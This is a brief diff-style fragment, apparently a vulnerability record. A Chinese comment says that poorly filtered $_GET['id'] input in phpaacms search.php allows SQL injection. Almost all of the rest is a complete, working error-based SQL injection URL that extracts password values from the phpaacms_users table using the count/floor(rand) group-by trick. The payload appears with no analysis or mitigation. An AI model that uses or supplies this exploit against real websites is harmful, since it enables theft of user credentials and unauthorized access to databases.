@@ -1,0 +1,4 @@
+search.php //变量$_GET['id']过滤不严造成的注射
+
+
+https://www.domain.com/phpaacms/search.php?id=1%20and(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20concat(0x7e,0x27,phpaacms_users.password,0x27,0x7e)%20FROM%20`phpaa`.phpaacms_users%20LIMIT%201,1)%20)%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1
